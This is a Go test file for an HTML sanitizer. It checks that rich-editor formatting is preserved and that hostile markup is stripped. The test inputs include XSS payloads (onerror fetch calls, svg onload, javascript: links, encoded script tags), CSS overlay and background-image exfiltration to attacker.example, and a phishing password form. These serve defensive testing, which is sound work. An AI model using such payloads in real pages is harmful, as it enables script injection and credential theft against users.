package htmlsanitize

import (
	"strings"
	"testing"

	"golang.org/x/net/html"
	"golang.org/x/net/html/atom"
)

// TestSanitize_PreservesEditorFormatting is the B102 regression: formatting the
// rich content editor produces (text alignment, highlight colour, link target)
// used to be stripped on save, so content silently lost formatting after a
// reload.
func TestSanitize_PreservesEditorFormatting(t *testing.T) {
	cases := []struct {
		name        string
		in          string
		mustContain []string
	}{
		{
			name:        "text-align on heading",
			in:          `<h2 style="text-align: center">Unit 1</h2>`,
			mustContain: []string{`style="text-align: center"`, "Unit 1"},
		},
		{
			name:        "highlight mark with background colour",
			in:          `<p><mark data-color="#ffc078" style="background-color: #ffc078; color: inherit">key idea</mark></p>`,
			mustContain: []string{"<mark", "background-color: #ffc078", `data-color="#ffc078"`},
		},
		{
			name:        "link target _blank keeps noopener",
			in:          `<a href="https://example.com/a" target="_blank">x</a>`,
			mustContain: []string{`target="_blank"`, "noopener"},
		},
		{
			name:        "html5 video with relative src",
			in:          `<video controls src="/courses/1/files/2/download"></video>`,
			mustContain: []string{"<video", "controls", `src="/courses/1/files/2/download"`},
		},
		{
			name:        "embed wrapper class kept with trusted iframe",
			in:          `<div class="rce-embed"><iframe src="https://www.youtube.com/embed/abc123XYZ" title="Embedded media" allowfullscreen frameborder="0"></iframe></div>`,
			mustContain: []string{`class="rce-embed"`, `src="https://www.youtube.com/embed/abc123XYZ"`},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			out := Sanitize(tc.in)
			for _, s := range tc.mustContain {
				if !strings.Contains(out, s) {
					t.Errorf("output should contain %q\ninput:  %q\noutput: %q", s, tc.in, out)
				}
			}
		})
	}
}

// TestSanitize_BlocksDangerousCSSAndMarkup makes sure widening the style
// allowlist did not open an overlay / exfiltration channel (B002).
func TestSanitize_BlocksDangerousCSSAndMarkup(t *testing.T) {
	cases := []struct {
		name           string
		in             string
		mustNotContain []string
	}{
		{"fixed-position overlay", `<div style="position: fixed; top: 0; left: 0; z-index: 9999">x</div>`, []string{"position", "z-index", "top:"}},
		{"background image url", `<p style="background-image: url(https://attacker.example/x)">x</p>`, []string{"url(", "attacker"}},
		{"style element", `<style>body *{visibility:hidden}</style><p>.</p>`, []string{"<style", "visibility"}},
		{"phishing form", `<form action="https://attacker.example/x"><input name="password"><button formaction="https://attacker.example/x">Log in</button></form>`, []string{"<form", "<input", "formaction", "attacker"}},
		{"untrusted iframe", `<iframe src="https://attacker.example/login"></iframe>`, []string{"attacker"}},
		{"javascript video src", `<video src="javascript:alert(1)"></video>`, []string{"javascript:"}},
		{"img onerror", `<img src="x" onerror="fetch('/api/v1/users')">`, []string{"onerror", "fetch"}},
		{"target other than _blank", `<a href="/x" target="_top">x</a>`, []string{"_top"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			out := Sanitize(tc.in)
			for _, s := range tc.mustNotContain {
				if strings.Contains(out, s) {
					t.Errorf("output should NOT contain %q\ninput:  %q\noutput: %q", s, tc.in, out)
				}
			}
		})
	}
}

// TestPlainText is the B005 regression: plain-text fields keep apostrophes and
// ampersands literally (no entity encoding) while still carrying no markup.
func TestPlainText(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"apostrophe and ampersand kept literally", "Don't forget A & B", "Don't forget A & B"},
		{"quotes kept", `She said "hi"`, `She said "hi"`},
		{"newlines kept", "line one\nline two\n\nline three", "line one\nline two\n\nline three"},
		{"lone less-than kept", "x < y and 3 > 2", "x < y and 3 > 2"},
		{"legacy entity-encoded value is repaired", "Don&#39;t forget A &amp; B", "Don't forget A & B"},
		{"markup stripped", `<b>bold</b> <img src=x onerror="alert(1)">text`, "bold text"},
		{"encoded markup decoded then stripped", "&lt;img src=x onerror=alert(1)&gt;safe", "safe"},
		{"double-encoded markup stripped", "&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;ok", "ok"},
		{"empty", "", ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := PlainText(tc.in)
			if got != tc.want {
				t.Errorf("PlainText(%q) = %q, want %q", tc.in, got, tc.want)
			}
			if again := PlainText(got); again != got {
				t.Errorf("PlainText not idempotent: %q -> %q", got, again)
			}
			for _, bad := range []string{"<img", "<script", "onerror="} {
				if strings.Contains(got, bad) {
					t.Errorf("PlainText(%q) still contains markup %q: %q", tc.in, bad, got)
				}
			}
		})
	}
}

func TestSanitize_Idempotent(t *testing.T) {
	in := `<h2 style="text-align: center">Don't &amp; <mark style="background-color: #ffc078">x</mark></h2><a href="https://example.com" target="_blank">l</a>`
	first := Sanitize(in)
	if second := Sanitize(first); first != second {
		t.Errorf("not idempotent\nfirst:  %q\nsecond: %q", first, second)
	}
}

// TestPlainText_InertWhenEmbeddedAsHTML backs the claim that PlainText output
// can be written raw into an HTML document (the exported portfolio site/PDF
// embeds portfolio section content verbatim): whatever the input, parsing the
// output as an HTML fragment yields text only, never an element or comment.
func TestPlainText_InertWhenEmbeddedAsHTML(t *testing.T) {
	inputs := []string{
		`<img src=x onerror=alert(1)>`,
		`&lt;img src=x onerror=alert(1)&gt;`,
		`&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;`,
		`<scr<script>ipt>alert(1)</scr</script>ipt>`,
		`<<img src=x onerror=alert(1)>img src=x onerror=alert(1)>`,
		`<!-- x --><svg/onload=alert(1)>`,
		`a < b and c > d, Don't & "quote"`,
		`<a href="javascript:alert(1)">x</a>`,
		"line one\n<b>line two</b>",
		`&#60;img src=x onerror=alert(1)&#62;`,
		`&#x3C;iframe src=//evil&#x3E;`,
	}
	ctx := &html.Node{Type: html.ElementNode, Data: "div", DataAtom: atom.Div}
	for _, in := range inputs {
		out := PlainText(in)
		nodes, err := html.ParseFragment(strings.NewReader(out), ctx)
		if err != nil {
			t.Fatalf("parse %q: %v", out, err)
		}
		for _, n := range nodes {
			if n.Type != html.TextNode {
				t.Errorf("PlainText(%q) = %q parses to a non-text node %q", in, out, n.Data)
			}
		}
	}
}
